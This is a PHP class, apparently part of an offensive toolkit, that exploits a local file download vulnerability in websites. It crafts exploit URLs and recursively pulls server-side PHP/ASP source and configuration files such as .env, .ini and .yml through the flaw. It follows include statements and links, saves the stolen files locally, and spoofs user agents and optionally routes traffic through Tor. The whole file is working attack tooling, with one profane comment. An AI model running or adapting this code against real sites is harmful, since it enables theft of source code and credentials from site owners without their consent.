<?php
/**
 * Created by PhpStorm.
 * User: lenonleite
 * Date: 01/07/16
 * Time: 18:13
 */

namespace Aszone\HackingAnalyzeStaticFiles;

use Aszone\FakeHeaders\FakeHeaders;
use GuzzleHttp\Client;
use Symfony\Component\DomCrawler\Crawler;

class DownloadByLocalFileDownload
{
    public $file;

    public $language;

    public $commandData;

    public $url;

    public $urlBaseExploit;

    public $folderSave;

    public $folderDownload;

    public function __construct($commandData)
    {

        $this->commandData = array_merge($this->defaultEnterData(), $commandData);
        $this->folderDownload = __DIR__."/../../../../results/lfd/";

    }

    public function setFolderDownload($dir){
        $this->folderDownload = $dir;
    }

    private function defaultEnterData()
    {
        $dataDefault['dork'] = false;
        $dataDefault['pl'] = false;
        $dataDefault['tor'] = false;
        $dataDefault['torl'] = false;
        $dataDefault['virginProxies'] = false;
        $dataDefault['proxyOfSites'] = false;

        return $dataDefault;
    }

    public function getAllFiles($url){

        $this->initRegister($url);

        $results['includes']=$this->downloadAllFiles();

        return $results;
    }

    protected function initRegister($url){

        $this->url =$url;
        $this->file =$this->readFile($url);

        $this->language = $this->checkLanguage();
        $this->folderSave = $this->getPatchFolder();
        $this->saveFile($this->file,$this->getNameFile($url));
        $this->urlBaseExploit = $this->getBaseExploit();

    }
    protected function downloadAllFiles(){

        $loop=false;
        if($this->file!=false){
            $urlFiles=$this->getMoreLinksByBody();
            $allUrlFiles=$urlFiles;
            $loop=true;
        }
        $urlValids=array();

        while($loop==true){
            $newUrlFiles=array();
            $urlFiles=array_unique($urlFiles);
            foreach($urlFiles as $urlFile){
                $body = $this->readFile($urlFile);
                //Check if is file of system
                if($this->checkIfFileSystem($body,$urlFile)){
                    echo $urlFile."\n";
                    $urlValids[]=$urlFile;
                    $this->saveFile($body,$this->getNameFile($urlFile));
                    $cacheUrlFiles=$this->getMoreLinksByBody($body,$urlFile);
                    if($cacheUrlFiles){
                        $newUrlFiles=array_merge($cacheUrlFiles,$newUrlFiles);
                    }
                }
            }
            $checktNewsFiles=array_diff($newUrlFiles,$allUrlFiles);
            $urlFiles=$checktNewsFiles;
            if(empty($checktNewsFiles)){
                $loop=false;
            }else{
                $allUrlFiles=array_merge($urlFiles,$allUrlFiles);
            }
        }

        return $urlValids;
    }

    protected function findIndexs($url=false){

        $arrBaseExploit=parse_url($this->getBaseExploit($url));

        if(!$url){
            $url=$this->urlBaseExploit;
            $arrBaseExploit=parse_url($url);
        }

        if($arrBaseExploit["path"]=="/"){
            return array();
        }

        $ext=explode(".",$arrBaseExploit["path"]);



        if(!isset($ext[1])){

            return array();
        }

        // Today I am very nervous... sonn of bith, bank, credit card bith
        $explodeQuery=array();
        if(!empty($arrBaseExploit['query'])){
            $explodeQuery=explode("/",$arrBaseExploit['query']);
        }
        $query=array();
        $patch="";
        $fragment="";
        if(isset($arrBaseExploit['fragment']) and (!empty($arrBaseExploit['fragment']))){
           $fragment= $arrBaseExploit['fragment'];
        }



        if((isset($explodeQuery[1]))AND(!empty($explodeQuery[1]))){
            array_pop($explodeQuery);
            foreach($explodeQuery as $parseQuery){

                $patch.=$parseQuery."/";
                $query[]=$arrBaseExploit["scheme"]."://".$arrBaseExploit["host"].$arrBaseExploit["path"]."?".$patch."index.".$ext[1].str_replace("#####","",$fragment);
                if($ext[1]=="asp"){
                    $query[]=$arrBaseExploit["scheme"]."://".$arrBaseExploit["host"].$arrBaseExploit["path"]."?".$patch."default.".$ext[1].str_replace("#####","",$fragment);
                }
            }
            //exit();
        }elseif((isset($explodeQuery[1]))AND(empty($explodeQuery[1]))){
            $query[]=$arrBaseExploit["scheme"]."://".$arrBaseExploit["host"].$arrBaseExploit["path"]."?".$explodeQuery[0]."/index.".$ext[1].str_replace("#####","",$fragment);
            if($ext[1]=="asp"){
                $query[]=$arrBaseExploit["scheme"]."://".$arrBaseExploit["host"].$arrBaseExploit["path"]."?".$explodeQuery[0]."/default.".$ext[1].str_replace("#####","",$fragment);
            }
        }else{
            $query[]=$arrBaseExploit["scheme"]."://".$arrBaseExploit["host"].$arrBaseExploit["path"]."?".$explodeQuery[0]."index.".$ext[1].str_replace("#####","",$fragment);
            //var_dump($query);
            if($ext[1]=="asp"){
                $query[]=$arrBaseExploit["scheme"]."://".$arrBaseExploit["host"].$arrBaseExploit["path"]."?".$explodeQuery[0]."default.".$ext[1].str_replace("#####","",$fragment);
            }
        }

        return $query;
    }


    protected function getMoreLinksByBody($body=false,$urlFile=false){

        if(!$body AND !$urlFile){
            $body=$this->file;
            $urlFile=$this->url;
        }

        $cacheUrlFiles=array();
        $cacheUrlFiles1=$this->getIncludes($body,$urlFile);
        $cacheUrlFiles2=$this->getLinks($body);
        $cacheUrlFiles3=$this->findIndexs($urlFile);

        if(!empty($cacheUrlFiles1)){
            $cacheUrlFiles=array_merge($cacheUrlFiles,$cacheUrlFiles1);
        }
        if(!empty($cacheUrlFiles2)){
            $cacheUrlFiles=array_merge($cacheUrlFiles,$cacheUrlFiles2);
        }
        if(!empty($cacheUrlFiles3)){
            $cacheUrlFiles=array_merge($cacheUrlFiles,$cacheUrlFiles3);
        }

        return $cacheUrlFiles;

    }

    private function saveFile($file,$nameFile)
    {

        $nameFile=$this->folderSave."/".str_replace("/","-",$nameFile);
        if(!is_dir($nameFile)){
            $myfile = fopen($nameFile, "w") or die("Unable to open file!");
            fwrite($myfile, $file);
            fclose($myfile);
        }

    }

    private function createFolder($folder){

        $pathname=$this->folderDownload.$folder;
        if(is_dir($pathname)){
            return $this->folderSave = $pathname;
        }
        $valid= mkdir($pathname);
        if($valid){
            return $this->folderSave = $pathname;
        }
        return false;
    }

    private function generateUrl($file,$patchFileNow=false){
        return str_replace("######",$file,$this->getBaseExploit($patchFileNow));
    }

    private function generateUrlAbsolute($file){
        return str_replace("######",$file,$this->getBaseExploit());
    }

    public function getIncludes($file,$patchFileNow=false){

        $resultFinal=array();
        $isValid = preg_match_all("/(include file|require_once|include_once|include|require)(.+|)(\(|\=|)(.+|)(\"|\')(.+?)(\"|\')((.+|))(\)|-->|)/i", $file, $m);

        //$this->urlBaseExploit
        if ($isValid) {
            $results=$this->sanitazePregMatchAll($m);
            foreach($results as $result){
                $resultFinal[]=$this->generateUrl($result,$patchFileNow);
                $resultFinal[]=$this->generateUrlAbsolute($result,$patchFileNow);
            }
            //var_dump($resultFinal);
            //return $resultFinal;
        }

        return $resultFinal;

    }

    public function checkLanguage(){
        $isValid = preg_match("/<%@|<%|<\?php|<\?=|<\?/", $this->file, $m);
        if ($isValid) {
            switch ($m[0]) {
                case "<?php":
                    $result= "php";
                    break;
                case "<?=":
                    $result= "php";
                    break;
                case "<?":
                    $result= "php";
                    break;
                case "<%@":
                    $result= "asp";
                    break;
                case "<%":
                    $result= "asp";
                    break;
            }
            return $result;
        }

        return false;
    }

    protected function readFile($url)
    {
        $header = new FakeHeaders();
        try {
            $client = new Client(['defaults' => [
                'headers' => ['User-Agent' => $header->getUserAgent()],
                'proxy' => $this->commandData['tor'],
                'timeout' => 30,
                ],
            ]);
            $resultBody = $client->get($url)->getBody()->getContents();
            return $resultBody;
        } catch (\Exception $e) {
            echo '#';
        }

        return false;
    }

    protected function sanitazePregMatchAll($matchs)
    {

        $result[0]=$matchs[0];
        $result[1]=$matchs[6];
        return $result[1];
    }

    protected function getBaseExploit($url=false)
    {

        if(!$url){
            $url=$this->url;
        }
        $validResult = preg_match("/." . $this->language . ".*?(=|\/)(.+?).(" . $this->language . "|inc|yml|ini)/i", $url, $m);
        if ($validResult) {
            $baseUrlTrash = $m[2] . "." . $this->language;

            $explodeBar = explode("/", $baseUrlTrash);

            if (!isset($explodeBar[1])) {
                return str_replace($baseUrlTrash, "######", $url);
            }
            array_pop($explodeBar);

            $arrBaseTrash=str_split($baseUrlTrash);

            $changeString="";
            if($arrBaseTrash[0]=="/"){
                $changeString="/";
            }
            if(count($explodeBar)>1){
                $changeString=implode("/", $explodeBar);

                if(substr($changeString, -1)!="/"){
                    $changeString.="/";
                }
            }
            $result= str_replace("=/".$baseUrlTrash, "=/".$changeString . "######", $url, $countNumberOfReplays);
            if($countNumberOfReplays==0){
                $result = str_replace("=".$baseUrlTrash, "=".$changeString . "######", $url,$countNumberOfReplays);
            }
            return $result;
        }
    }

    protected function getNameFile($url){

        $validResult = preg_match("/.".$this->language.".*?(=|\/)(.+?)\.(".$this->language."|ini|inc|yml|env|html)/i", $url, $m);

        if ($validResult) {
            return $m[2] . "." . $m[3];
        }
        return false;

    }

    protected function getPatchFolder(){
        $urlExplode=parse_url($this->url);
        return $this->createFolder($urlExplode['host']);
    }

    protected function checkIfFileSystem($body,$urlFile){


        $isValid = preg_match("/<%@|<%|<\?php|<\?=|<\?/", $body, $m);
        $validResult = preg_match("/.".$this->language.".*?(=|\/)(.+?)\.(".$this->language."|ini|inc|yml|env|html)/i", $urlFile,
            $m2);

        if($isValid or ( $validResult and ($m2[3]=="ini" or $m2[3]=="inc" or $m2[3]=="yml" or $m2[3]=="env"))){
            return true;
        }
        return false;
    }

    protected function getLinks($body)
    {
        //var_dump($body);
        $crawler = new Crawler($body);
        $urls=array();
        $crawler->filter('a')->each(function (Crawler $node, $i) use(&$res) {
            $res[]= $node->attr('href');
        });
        $crawler->filter('area')->each(function (Crawler $node, $i) use(&$res) {
            $res[]= $node->attr('href');
        });
        if($res){
            foreach($res as $r){
                $urls[]=$this->generateExploitOfLinkInBody($r);
            }
        }


        return $urls;

    }

    protected function generateExploitOfLinkInBody($url){

        $arrUrl=parse_url($url);
        if(isset($arrUrl['path'])){
            return str_replace("######",$arrUrl['path'],$this->getBaseExploit());
        }
        return false;

    }
}
